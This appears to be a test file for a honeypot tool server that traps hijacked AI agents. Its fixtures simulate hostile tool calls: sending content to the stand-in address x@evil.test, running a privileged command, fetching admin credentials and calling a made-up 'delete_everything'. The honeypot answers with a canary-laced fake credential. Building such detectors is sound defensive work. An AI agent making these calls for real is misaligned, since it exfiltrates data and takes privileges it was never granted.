import { describe, expect, it } from "vitest";
import { alertFor, createDecoy, DECOY_TOOLS, secretFor, type DecoyAlert, type TraceEvent } from "./index.js";

const call = (id: number, name: string, args: Record<string, unknown> = {}) => ({ jsonrpc: "2.0", id, method: "tools/call", params: { name, arguments: args } });
const bodyOf = (reply: unknown) => ((reply as { result: { content: { text: string }[] } }).result.content[0]!.text);

describe("createDecoy", () => {
  const make = () => {
    const alerts: DecoyAlert[] = []; const calls: TraceEvent[] = [];
    const pot = createDecoy({ canary: "CANARY-1", onAlert: alert => alerts.push(alert), onCall: event => calls.push(event), now: () => new Date("2026-11-26T12:00:00Z") });
    return { pot, alerts, calls };
  };

  it("lists only decoy tools", () => {
    const { pot } = make();
    const tools = (pot.handle({ jsonrpc: "2.0", id: 1, method: "tools/list" })!.result as { tools: { name: string }[] }).tools;
    expect(tools.map(tool => tool.name)).toEqual(DECOY_TOOLS.map(tool => tool.name));
  });

  it("alerts on every call, whatever the tool, with the arguments and the time", () => {
    const { pot, alerts, calls } = make();
    pot.handle(call(1, "send_to_external_address", { to: "x@evil.test", content: "hello" }));
    pot.handle(call(2, "run_privileged_command", { command: "id" }));
    expect(alerts.map(alert => alert.tool)).toEqual(["send_to_external_address", "run_privileged_command"]);
    expect(alerts[0]).toMatchObject({ time: "2026-11-26T12:00:00.000Z", privilege: "network-out", seq: 1, args: { to: "x@evil.test", content: "hello" } });
    expect(alerts[0]!.text).toContain("an agent called send_to_external_address (to=x@evil.test; content=hello)");
    expect(calls).toHaveLength(2);
  });

  it("alerts on an unknown tool name too, since a hijacked agent may guess one", () => {
    const { pot, alerts } = make();
    pot.handle(call(1, "delete_everything"));
    expect(alerts).toHaveLength(1);
    expect(alerts[0]).toMatchObject({ tool: "delete_everything", privilege: "unknown" });
  });

  it("hands back a fake credential that carries the canary", () => {
    const { pot } = make();
    expect(bodyOf(pot.handle(call(1, "get_admin_credentials")))).toContain(secretFor("CANARY-1"));
    expect(bodyOf(pot.handle(call(2, "export_all_records")))).toBe("Export queued.");
    expect(bodyOf(pot.handle(call(3, "run_privileged_command", { command: "id" })))).toBe("ok");
  });

  it("does not alert on protocol messages", () => {
    const { pot, alerts } = make();
    pot.handle({ jsonrpc: "2.0", id: 1, method: "initialize", params: {} });
    pot.handle({ jsonrpc: "2.0", id: 2, method: "tools/list" });
    pot.handle({ jsonrpc: "2.0", id: 3, method: "ping" });
    expect(alerts).toEqual([]);
  });
});

describe("alertFor", () => {
  it("cuts long argument values", () => {
    const alert = alertFor({ seq: 1, tool: "send_to_external_address", privilege: "network-out", args: { content: "x".repeat(900) } }, new Date(0));
    expect(alert.args["content"]!.length).toBeLessThan(310);
  });
  it("names no arguments when there are none", () => {
    expect(alertFor({ seq: 1, tool: "get_admin_credentials", privilege: "read-local", args: {} }, new Date(0)).text).toContain("an agent called get_admin_credentials.");
  });
});
